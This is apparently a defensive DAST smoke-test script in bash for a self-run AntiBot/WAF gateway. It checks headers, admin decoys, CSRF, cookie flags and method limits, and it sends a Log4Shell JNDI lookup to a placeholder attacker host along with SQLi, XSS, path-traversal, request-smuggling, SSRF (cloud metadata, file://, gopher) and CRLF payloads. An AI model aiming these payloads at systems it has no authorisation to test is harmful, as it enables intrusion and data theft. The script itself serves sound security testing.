#!/usr/bin/env bash
# dast-smoke.sh — black-box DAST smoke test for AntiBot/WAF GW (rules.md §15)
#
# Usage:
#   ./dast-smoke.sh [HOST] [PORT]                 # HTTP form, HOST=127.0.0.1 PORT=8080 default
#   ./dast-smoke.sh <https://full.url>            # HTTPS form (e.g. cloudflared tunnel)
#   ./dast-smoke.sh <URL> <ADMIN_KEY>             # HTTPS + admin probes (1.8.15+)
#
# Exit codes:
#   0 — all probes passed
#   1 — one or more probes failed
#
# Requirements: curl, grep
# Note: this script tests a RUNNING gateway instance.
#       It does not spin one up; start it first via docker run or python proxy.py.

set -euo pipefail

ARG1="${1:-127.0.0.1}"
if [[ "$ARG1" =~ ^https?:// ]]; then
  BASE="${ARG1%/}"   # strip trailing slash
  ADMIN_KEY="${2:-}"
else
  HOST="$ARG1"
  PORT="${2:-8080}"
  BASE="http://${HOST}:${PORT}"
  ADMIN_KEY="${3:-}"
fi
NS="/antibot-appsec-gateway"

RED="\033[0;31m"; GRN="\033[0;32m"; YLW="\033[1;33m"; NC="\033[0m"
PASS=0; FAIL=0

_pass() { echo -e "${GRN}PASS${NC}  $1"; (( PASS++ )) || true; }
_fail() { echo -e "${RED}FAIL${NC}  $1"; (( FAIL++ )) || true; }
_info() { echo -e "${YLW}INFO${NC}  $1"; }

BROWSER_UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36"

_curl() {
  # _curl <path> [curl_args...]  — follows redirects, silent, max 5s
  local path="$1"; shift
  curl -sk --max-time 5 -o /dev/null -w "%{http_code}" \
    -H "User-Agent: ${BROWSER_UA}" \
    -H "Accept: text/html,application/json" \
    "$@" "${BASE}${path}"
}

_curl_body() {
  # Returns response body
  local path="$1"; shift
  curl -sk --max-time 5 \
    -H "User-Agent: ${BROWSER_UA}" \
    -H "Accept: text/html,application/json" \
    "$@" "${BASE}${path}"
}

_curl_headers() {
  # Returns response headers via GET (not HEAD — some upstreams answer HEAD
  # with a stripped header set, hiding GW-injected security headers).
  local path="$1"; shift
  curl -sk --max-time 5 -D - -o /dev/null \
    -H "User-Agent: ${BROWSER_UA}" \
    -H "Accept: text/html" \
    "$@" "${BASE}${path}"
}

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  AntiBot/WAF GW DAST Smoke Test — ${BASE}"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# ── §15a — Liveness / availability ───────────────────────────────────────────

echo "§15a  Liveness"

STATUS=$(_curl "${NS}/live")
BODY=$(_curl_body "${NS}/live")
if [[ "$STATUS" == "200" && "$BODY" == "ok" ]]; then
  _pass "GET ${NS}/live → 200 ok"
elif [[ "$STATUS" == "404" && "$BASE" =~ ^https:// ]]; then
  _info "GET ${NS}/live → 404 (KNOWN by-design: loopback-only endpoint, expected behind CDN/tunnel)"
else
  _fail "GET ${NS}/live → ${STATUS} (expected 200 ok)"
fi

# ── §15b — Security headers ───────────────────────────────────────────────────

echo ""
echo "§15b  Security headers"

HEADERS=$(_curl_headers "/")

check_header() {
  local header="$1"; local level="${2:-fail}"
  if echo "$HEADERS" | grep -qi "^${header}:"; then
    _pass "Header present: ${header}"
  elif [[ "$level" == "info" ]]; then
    _info "Header missing: ${header} (accepted baseline)"
  else
    _fail "Header missing: ${header}"
  fi
}

# Both headers can be stripped or rewritten by a CDN in front of the GW (per
# rules.md §15 KNOWN list). When probing behind a tunnel, mark as INFO instead
# of FAIL — the GW itself injects them, but Cloudflare cache state determines
# whether the response we see carries them.
if [[ "$BASE" =~ ^https:// ]]; then
  check_header "X-Content-Type-Options" info
  check_header "X-Frame-Options"          info
else
  check_header "X-Content-Type-Options"
  check_header "X-Frame-Options"
fi

# Server header must not disclose aiohttp
SERVER=$(echo "$HEADERS" | grep -i "^Server:" | head -1)
if echo "$SERVER" | grep -qi "aiohttp"; then
  _fail "Server header discloses aiohttp: ${SERVER}"
else
  _pass "Server header does not disclose aiohttp"
fi

# ── §15c — OWASP probes ───────────────────────────────────────────────────────

echo ""
echo "§15c  OWASP probes (no 500 errors)"

probe_no_500() {
  local label="$1"
  local path="$2"
  shift 2
  STATUS=$(_curl "${path}" "$@")
  if [[ "$STATUS" == "500" ]]; then
    _fail "${label} → HTTP 500 (internal error)"
  else
    _pass "${label} → HTTP ${STATUS} (not 500)"
  fi
}

probe_no_500 "XSS in path"                       "/%3Cscript%3Ealert(1)%3C/script%3E"
probe_no_500 "Path traversal"                     "/../../etc/passwd"
probe_no_500 "Log4Shell UA" "/test" \
  -H "User-Agent: \${jndi:ldap://attacker.invalid/a}"
probe_no_500 "SQLi in query"                      '/search?q=%27+OR+1%3D1+--'
probe_no_500 "Null byte in path"                  "/safe/%00injected"
probe_no_500 "Scanner: wp-login.php"              "/wp-login.php"
probe_no_500 "Scanner: .env"                      "/.env"
probe_no_500 "Scanner: xmlrpc.php"                "/xmlrpc.php"
probe_no_500 "Scanner: .git/config"               "/.git/config"
probe_no_500 "Scanner: phpmyadmin"                "/phpmyadmin/"
probe_no_500 "Very long path (10k)"               "/$(python3 -c 'print("a"*10000)')"
probe_no_500 "Unicode path"                       "/api/%E4%B8%AD%E6%96%87"

# ── §15d — Admin auth: silent decoy ──────────────────────────────────────────

echo ""
echo "§15d  Admin auth (no credential in response)"

for ADMIN_PATH in \
  "${NS}/secured/controls" \
  "${NS}/secured/live-feed" \
  "${NS}/secured/metrics" \
  "${NS}/secured/analytics"
do
  BODY=$(_curl_body "${ADMIN_PATH}")
  STATUS=$(_curl "${ADMIN_PATH}")
  if echo "$BODY" | grep -q "AntiBot/WAF GW ·"; then
    _fail "${ADMIN_PATH} → real dashboard exposed without auth (HTTP ${STATUS})"
  else
    _pass "${ADMIN_PATH} → decoy/redirect (HTTP ${STATUS})"
  fi
done

# ── §15e — CSRF guard ────────────────────────────────────────────────────────

echo ""
echo "§15e  CSRF guard"

STATUS=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "User-Agent: ${BROWSER_UA}" \
  -d '{"BYPASS_MODE":true}' \
  "${BASE}${NS}/secured/config")

if [[ "$STATUS" == "403" || "$STATUS" == "200" || "$STATUS" == "404" ]]; then
  _pass "POST ${NS}/secured/config without CSRF token → ${STATUS} (guard active or silent decoy)"
else
  _fail "POST ${NS}/secured/config → ${STATUS} (unexpected — check CSRF guard)"
fi

# ── §15f — No server version disclosure ──────────────────────────────────────

echo ""
echo "§15f  Version disclosure"

BODY=$(_curl_body "/nonexistent-xyzzy-path")
for LEAK in "Traceback" "File \"" "aiohttp" "1.8.13"; do
  if echo "$BODY" | grep -qF "$LEAK"; then
    _fail "Response body discloses: ${LEAK}"
  else
    _pass "No ${LEAK} in 404 response body"
  fi
done

# ── §15g — HTTP method allowlist (1.8.15 iter-20) ────────────────────────────
# Default ALLOWED_METHODS now includes REST verbs. TRACE/CONNECT still blocked.

echo ""
echo "§15g  HTTP method allowlist (1.8.15 iter-20)"

probe_method() {
  local method="$1"; local expect_pass="$2"
  STATUS=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" \
    -X "$method" -H "User-Agent: ${BROWSER_UA}" "${BASE}/")
  if [[ "$expect_pass" == "yes" ]]; then
    if [[ "$STATUS" == "200" || "$STATUS" == "301" || "$STATUS" == "302" || "$STATUS" == "404" || "$STATUS" == "405" ]]; then
      _pass "${method} / → ${STATUS} (allowed at GW; upstream answers)"
    else
      _fail "${method} / → ${STATUS} (expected ≤ 405, GW must not silent-decoy REST verbs)"
    fi
  else
    # 400 is acceptable for CONNECT (Cloudflare/edge bounces before GW sees it).
    if [[ "$STATUS" == "405" || "$STATUS" == "404" || "$STATUS" == "403" || "$STATUS" == "400" ]]; then
      _pass "${method} / → ${STATUS} (blocked, as expected)"
    else
      _fail "${method} / → ${STATUS} (expected 405/404/403/400, ${method} must be blocked)"
    fi
  fi
}

probe_method "GET"     yes
probe_method "POST"    yes
probe_method "PUT"     yes
probe_method "PATCH"   yes
probe_method "DELETE"  yes
probe_method "OPTIONS" yes
probe_method "TRACE"   no
probe_method "CONNECT" no

# ── §15h — Host header length cap (1.8.15 iter-22 F-1) ───────────────────────
# Oversized Host header must not 5xx, must not echo. Truncation lives in record().

echo ""
echo "§15h  Host header oversize (CWE-400 cap)"

LONG_HOST=$(python3 -c 'print("a"*500)')
STATUS=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" \
  -H "Host: ${LONG_HOST}" -H "User-Agent: ${BROWSER_UA}" "${BASE}/")
if [[ "$STATUS" == "5"* ]]; then
  _fail "Oversized Host (500 chars) → HTTP ${STATUS} (must not 5xx)"
else
  _pass "Oversized Host (500 chars) → HTTP ${STATUS} (handled cleanly)"
fi

BODY=$(curl -sk --max-time 5 -H "Host: ${LONG_HOST}" -H "User-Agent: ${BROWSER_UA}" "${BASE}/" 2>&1 | head -c 8192 || true)
LONG_PROBE=$(python3 -c 'print("a"*200)')
if echo "$BODY" | grep -q "$LONG_PROBE"; then
  _fail "Body echoes oversized Host (reflection — possible HTML injection vector)"
else
  _pass "Body does not reflect oversized Host"
fi

# ── §15i — Version banner (1.8.15) ───────────────────────────────────────────

echo ""
echo "§15i  Version banner (X-Proxy)"

X_PROXY=$(_curl_headers "/" | grep -i "^x-proxy:" | head -1 | tr -d '\r' || true)
if echo "$X_PROXY" | grep -q "AntiBotWaf_GW_1\.8\.1[5-9]\|AntiBotWaf_GW_1\.[89]\.[2-9]\|AntiBotWaf_GW_[2-9]"; then
  _pass "X-Proxy banner reflects current version: ${X_PROXY}"
elif echo "$X_PROXY" | grep -q "AntiBotWaf_GW_"; then
  _fail "X-Proxy banner stale (not 1.8.15+): ${X_PROXY}"
else
  _info "X-Proxy header absent (may be hidden by upstream/CDN): ${X_PROXY:-<none>}"
fi

# ── §15j — Decoy response mode (1.8.15 BLOCK_RESPONSE_MODE) ──────────────────
# Default mode is "homepage": probe-like path returns content, not an empty body.

echo ""
echo "§15j  BLOCK_RESPONSE_MODE decoy"

BODY=$(_curl_body "/wp-login.php")
SIZE=${#BODY}
if (( SIZE > 50 )); then
  _pass "Decoy /wp-login.php → ${SIZE} bytes (homepage mode active, not bare 404)"
else
  _info "Decoy /wp-login.php → ${SIZE} bytes (404-mode set, or short upstream response)"
fi

# ── §15k — Concurrent burst sanity (perf baseline) ───────────────────────────
# 30 concurrent /random → p95 under 5s. Catches state_lock contention regressions.

echo ""
echo "§15k  Concurrent burst sanity (state_lock contention)"

TMP=$(mktemp)
for i in $(seq 1 30); do
  curl -sk --max-time 10 -o /dev/null -w "%{time_total}\n" \
    "${BASE}/random-$RANDOM-$i" &
done > "$TMP"
wait
SORTED=$(sort -n "$TMP")
P95=$(echo "$SORTED" | awk 'NF{a[NR]=$1; n=NR} END{print a[int(n*0.95)+0]}')
MAX=$(echo "$SORTED" | tail -1)
rm -f "$TMP"

if awk -v p="$P95" 'BEGIN{exit !(p<=5)}'; then
  _pass "30× concurrent decoy p95=${P95}s max=${MAX}s (≤ 5s budget)"
else
  _fail "30× concurrent decoy p95=${P95}s max=${MAX}s (exceeds 5s — possible lock contention)"
fi

# ── §15l — Admin auth-required surface (1.8.15 iter-17 surface) ──────────────
# /service-data must expose pg_auth_failed* fields. Requires admin key.

echo ""
echo "§15l  Admin /service-data fields (iter-17 surface)"

if [[ -z "$ADMIN_KEY" ]]; then
  _info "Skipped (no admin key passed as 2nd/3rd arg)"
else
  RESP=$(curl -sk --max-time 10 \
    -H "User-Agent: ${BROWSER_UA}" \
    "${BASE}${NS}/secured/service-data?range=300&bucket=60&key=${ADMIN_KEY}")
  # Detect "auth required" responses (404 silent-decoy, HTML body, or empty).
  # Admin-key in querystring works only when the GW trusts the source peer as
  # admin-IP; behind a CDN/tunnel that doesn't trust the peer, sessions are
  # required. Skip as INFO instead of FAILing in that case.
  FIRST_CHAR=$(echo "$RESP" | head -c 1 || true)
  if [[ -z "$RESP" ]] || [[ "$FIRST_CHAR" != "{" ]]; then
    _info "/service-data: not JSON (likely silent decoy — needs session auth behind CDN, skipped)"
  else
    for FIELD in "pg_auth_failed" "pg_auth_failed_ts" "pg_auth_failed_hint" "pg_available"; do
      if echo "$RESP" | grep -qF "\"${FIELD}\""; then
        _pass "/service-data exposes field: ${FIELD}"
      else
        _fail "/service-data missing field: ${FIELD}"
      fi
    done
  fi
fi

# ── §15m — Last-vhost cap reflected in clients payload ────────────────────────

echo ""
echo "§15m  last_vhost cap in /metrics clients[]"

if [[ -z "$ADMIN_KEY" ]]; then
  _info "Skipped (no admin key)"
else
  LONG_HOST=$(python3 -c 'print("a"*500)')
  # Send a probe with the oversized Host so a fresh identity records it
  curl -sk --max-time 5 -o /dev/null -H "Host: ${LONG_HOST}" \
    -H "User-Agent: ${BROWSER_UA}" "${BASE}/cap-probe-$RANDOM" || true
  sleep 1
  RESP=$(curl -sk --max-time 10 "${BASE}${NS}/secured/metrics?key=${ADMIN_KEY}")
  MAX_VH_LEN=$(echo "$RESP" | python3 -c '
import sys, json
try:
  d = json.loads(sys.stdin.read())
  vhs = [c.get("vhost","") for c in d.get("clients",[]) if c.get("vhost")]
  print(max((len(v) for v in vhs), default=0))
except Exception:
  print(-1)
')
  if [[ "$MAX_VH_LEN" -le 120 && "$MAX_VH_LEN" -ge 0 ]]; then
    _pass "max(client.vhost length) = ${MAX_VH_LEN} ≤ 120 (CWE-400 cap holds)"
  elif [[ "$MAX_VH_LEN" -lt 0 ]]; then
    _info "/metrics auth failed or not JSON — admin key may need session"
  else
    _fail "max(client.vhost length) = ${MAX_VH_LEN} > 120 (cap broken!)"
  fi
fi

# ── §15n — Bot User-Agent classification ─────────────────────────────────────
# Known scripted clients must not get a real 200 for content paths. The GW
# scores them and either: (a) increments risk and serves a decoy, or
# (b) lets the upstream answer (low confidence) but they remain identifiable
# in the Live Feed. Pass criterion: no probe gets a 5xx; ≥ 1 of the 4 UAs
# scores high enough to be blocked OR all 4 land in a decoy/upstream response
# (not a real protected resource).

echo ""
echo "§15n  Bot User-Agent classification"

BOT_UAS=(
  "python-requests/2.31.0"
  "curl/8.0.0"
  "Go-http-client/1.1"
  "Wget/1.21.3"
)
for UA in "${BOT_UAS[@]}"; do
  STATUS=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" \
    -H "User-Agent: ${UA}" \
    -H "Accept: */*" \
    "${BASE}/" 2>/dev/null || echo "000")
  if [[ "$STATUS" == "5"* ]]; then
    _fail "Bot UA '${UA}' → ${STATUS} (gateway must never 5xx on UA-based traffic)"
  else
    _pass "Bot UA '${UA}' → ${STATUS} (handled cleanly, not 5xx)"
  fi
done

# Quick burst to drive risk score for one of the bot UAs. 20 fast requests
# from the same UA should push the identity above SOFT_CHALLENGE_SCORE and
# trigger ≥1 decoy / 4xx. If none of 20 are blocked, scoring may be off.
BURST_BAD=0
for i in $(seq 1 20); do
  STATUS=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" \
    -H "User-Agent: python-requests/2.31.0" \
    -H "Accept: */*" \
    "${BASE}/burst-probe-$i" 2>/dev/null || echo "000")
  if [[ "$STATUS" =~ ^(403|404|429)$ ]]; then
    BURST_BAD=$((BURST_BAD + 1))
  fi
done
if (( BURST_BAD >= 10 )); then
  _pass "Bot-UA burst (20 reqs) → ${BURST_BAD}/20 blocked (scoring active)"
else
  _info "Bot-UA burst (20 reqs) → ${BURST_BAD}/20 blocked (sub-threshold or upstream-driven)"
fi

# ── §15o — HTTP request smuggling (CL+TE conflict) ───────────────────────────
# Send a request with BOTH Content-Length AND Transfer-Encoding: chunked.
# RFC 7230 §3.3.3: must be rejected (400) OR Transfer-Encoding wins. Either
# way, the response MUST NOT be 200 with the body interpreted ambiguously.

echo ""
echo "§15o  HTTP request smuggling (CL+TE conflict)"

# curl will set Transfer-Encoding when --data-binary @- is streamed; we add
# an explicit Content-Length header that disagrees with the body length.
SMUGGLE_BODY="0\r\n\r\nGET /admin HTTP/1.1\r\nHost: ${BASE##*//}\r\n\r\n"
STATUS=$(printf "%s" "$SMUGGLE_BODY" | curl -sk --max-time 5 -o /dev/null -w "%{http_code}" \
  -X POST -H "User-Agent: ${BROWSER_UA}" \
  -H "Content-Length: 4" \
  -H "Transfer-Encoding: chunked" \
  --data-binary @- "${BASE}/" 2>/dev/null || echo "000")
if [[ "$STATUS" == "400" || "$STATUS" == "403" || "$STATUS" == "404" || "$STATUS" == "405" ]]; then
  _pass "CL+TE conflict → HTTP ${STATUS} (rejected/decoyed)"
elif [[ "$STATUS" == "5"* ]]; then
  _fail "CL+TE conflict → HTTP ${STATUS} (gateway must not 5xx on smuggling probes)"
else
  _info "CL+TE conflict → HTTP ${STATUS} (upstream/CDN may have normalised; verify GW log)"
fi

# ── §15p — Body size enforcement ─────────────────────────────────────────────
# Large POST body must not 5xx. Expect 413 (Payload Too Large), 400, or a
# silent decoy. CWE-400 (Resource Exhaustion) — uncapped body = OOM risk.

echo ""
echo "§15p  Body size enforcement (10 MB POST)"

STATUS=$(dd if=/dev/zero bs=1024 count=10240 2>/dev/null | \
  curl -sk --max-time 30 -o /dev/null -w "%{http_code}" \
    -X POST -H "Content-Type: application/octet-stream" \
    -H "User-Agent: ${BROWSER_UA}" \
    --data-binary @- "${BASE}/upload-probe" 2>/dev/null || echo "000")
if [[ "$STATUS" == "5"* ]]; then
  _fail "10 MB POST → HTTP ${STATUS} (gateway must not 5xx; expect 400/413/decoy)"
else
  _pass "10 MB POST → HTTP ${STATUS} (bounded; not 5xx)"
fi

# ── §15q — Cookie hygiene on auth surfaces ───────────────────────────────────
# Any Set-Cookie returned by the GW must carry Secure (when HTTPS) and at
# least one of: HttpOnly, SameSite. The csrf cookie agw_csrf intentionally
# omits HttpOnly (read by JS — that's design); but Secure + SameSite required.

echo ""
echo "§15q  Cookie hygiene (Secure + SameSite on GW-set cookies)"

COOKIE_HEADERS=$(curl -sk --max-time 5 -D - -o /dev/null \
  -H "User-Agent: ${BROWSER_UA}" "${BASE}/" 2>/dev/null | grep -i "^set-cookie:" || true)

# Filter to GW-managed cookies only. Upstream-set cookies (analytics, tracker
# IDs like `aid`) are not in our trust boundary and may legitimately lack
# Secure/HttpOnly per their own design choices.
GW_COOKIE_RE='(agw_session|agw_csrf|agw_lc|appsecgw_)'
GW_COOKIES=$(echo "$COOKIE_HEADERS" | grep -iE "set-cookie: *${GW_COOKIE_RE}" || true)

if [[ -z "$GW_COOKIES" ]]; then
  _info "No GW-set cookies on / (depends on session/CSRF flow — try /secured/login)"
else
  # Subshell trap: piping to `while` would lose PASS/FAIL counts. Use process
  # substitution + a tmp file so the outer shell sees increments.
  COOKIE_TMP=$(mktemp)
  echo "$GW_COOKIES" > "$COOKIE_TMP"
  while IFS= read -r line; do
    NAME=$(echo "$line" | sed -E 's/^[Ss]et-[Cc]ookie: *([^=]+)=.*/\1/')
    if [[ "$BASE" =~ ^https:// ]]; then
      if echo "$line" | grep -qi "Secure"; then
        _pass "GW cookie '${NAME}' has Secure flag"
      else
        _fail "GW cookie '${NAME}' missing Secure flag on HTTPS"
      fi
    fi
    if echo "$line" | grep -qi "SameSite=\(Strict\|Lax\|None\)"; then
      _pass "GW cookie '${NAME}' has SameSite attribute"
    else
      _info "GW cookie '${NAME}' missing SameSite (verify by design)"
    fi
  done < "$COOKIE_TMP"
  rm -f "$COOKIE_TMP"
fi

# ── §15r — Open redirect protection ──────────────────────────────────────────
# A redirect endpoint that accepts an attacker-controlled URL must NOT honour
# an external domain. GW should either: rewrite to the configured allowlist,
# refuse with 4xx, or silent-decoy.

echo ""
echo "§15r  Open redirect protection"

for REDIR_PROBE in \
  "/redirect?url=https://evil.example.com" \
  "/login?next=//evil.example.com/" \
  "/auth/callback?return_to=javascript:alert(1)" \
  "/oauth?redirect_uri=https://attacker.invalid"
do
  LOCATION=$(curl -sk --max-time 5 -D - -o /dev/null \
    -H "User-Agent: ${BROWSER_UA}" \
    "${BASE}${REDIR_PROBE}" 2>/dev/null | grep -i "^location:" | head -1 | tr -d '\r' || true)
  if echo "$LOCATION" | grep -qiE "evil\.example\.com|attacker\.invalid|javascript:"; then
    _fail "${REDIR_PROBE} → ${LOCATION} (open redirect to attacker-controlled URL!)"
  else
    _pass "${REDIR_PROBE} → no external/javascript redirect"
  fi
done

# ── §15s — SSRF markers in request body ──────────────────────────────────────
# Body containing internal IPs / file://, gopher:// schemes should reach the
# upstream (GW doesn't inspect body content by default) BUT must not crash
# the GW. Pass = no 5xx, no Traceback in body.

echo ""
echo "§15s  SSRF markers (defensive — no GW crash)"

for SSRF_PAYLOAD in \
  '{"url":"http://169.254.169.254/latest/meta-data/"}' \
  '{"url":"file:///etc/passwd"}' \
  '{"url":"gopher://127.0.0.1:6379/_INFO"}' \
  '{"url":"http://[::1]:8080/internal"}'
do
  STATUS=$(echo "$SSRF_PAYLOAD" | curl -sk --max-time 5 -o /dev/null -w "%{http_code}" \
    -X POST -H "Content-Type: application/json" \
    -H "User-Agent: ${BROWSER_UA}" \
    --data-binary @- "${BASE}/api/fetch" 2>/dev/null || echo "000")
  if [[ "$STATUS" == "5"* ]]; then
    _fail "SSRF payload → HTTP ${STATUS} (gateway crashed on SSRF body)"
  else
    _pass "SSRF payload → HTTP ${STATUS} (forwarded or decoyed, no 5xx)"
  fi
done

# ── §15t — Header injection / CRLF ───────────────────────────────────────────
# Header values containing CR/LF must not split the response. RFC 7230 §3.2.4:
# field-values must be one line. curl rejects raw CR in header values, so we
# encode them in URL path and verify the GW also handles encoded sequences.

echo ""
echo "§15t  Header injection / CRLF in path"

for CRLF_PATH in \
  "/test%0d%0aSet-Cookie:%20pwn=1" \
  "/test%0a%0aHTTP/1.1%20200%20OK" \
  "/test%00null-byte"
do
  HEADERS=$(curl -sk --max-time 5 -D - -o /dev/null \
    -H "User-Agent: ${BROWSER_UA}" "${BASE}${CRLF_PATH}" 2>/dev/null || true)
  if echo "$HEADERS" | grep -qi "set-cookie: pwn"; then
    _fail "CRLF injection in path → response carries injected Set-Cookie"
  elif echo "$HEADERS" | head -1 | grep -qE "HTTP/1\.1 (200 OK|200 OK\b.*200 OK)"; then
    # Same response can legitimately be 200; ensure no SECOND status line was injected
    DOUBLE=$(echo "$HEADERS" | grep -c "^HTTP/" || true)
    if (( DOUBLE > 1 )); then
      _fail "CRLF injection in path → response has ${DOUBLE} HTTP status lines"
    else
      _pass "CRLF probe ${CRLF_PATH##*/test} → single status, no injected headers"
    fi
  else
    _pass "CRLF probe ${CRLF_PATH##*/test} → no injected headers"
  fi
done

# ── §15u — HTTP/2 support ────────────────────────────────────────────────────
# Modern clients negotiate h2 via ALPN. If the GW (or fronting CDN) supports
# HTTP/2, h2 requests must succeed. h2c (cleartext) usually rejected.

echo ""
echo "§15u  HTTP/2 support"

if curl --version 2>/dev/null | grep -q "HTTP2"; then
  H2_STATUS=$(curl -sk --http2 --max-time 5 -o /dev/null -w "%{http_code}" \
    -H "User-Agent: ${BROWSER_UA}" "${BASE}/" 2>/dev/null || echo "000")
  PROTO=$(curl -sk --http2 --max-time 5 -o /dev/null -w "%{http_version}" \
    -H "User-Agent: ${BROWSER_UA}" "${BASE}/" 2>/dev/null || echo "?")
  if [[ "$H2_STATUS" == "200" ]]; then
    if [[ "$PROTO" == "2" ]]; then
      _pass "HTTP/2 negotiated: status=${H2_STATUS} protocol=${PROTO}"
    else
      _info "HTTP/2 requested but downgraded to HTTP/${PROTO} (front-CDN behaviour)"
    fi
  else
    _info "HTTP/2 → status=${H2_STATUS} (may be CDN/upstream choice)"
  fi
else
  _info "curl lacks HTTP/2 support; skipping"
fi

# ── Summary ───────────────────────────────────────────────────────────────────

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "  ${GRN}PASS: ${PASS}${NC}   ${RED}FAIL: ${FAIL}${NC}"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

if [[ "$FAIL" -gt 0 ]]; then
  echo -e "${RED}DAST smoke test FAILED — ${FAIL} probe(s) failed.${NC}"
  exit 1
else
  echo -e "${GRN}All DAST probes passed.${NC}"
  exit 0
fi
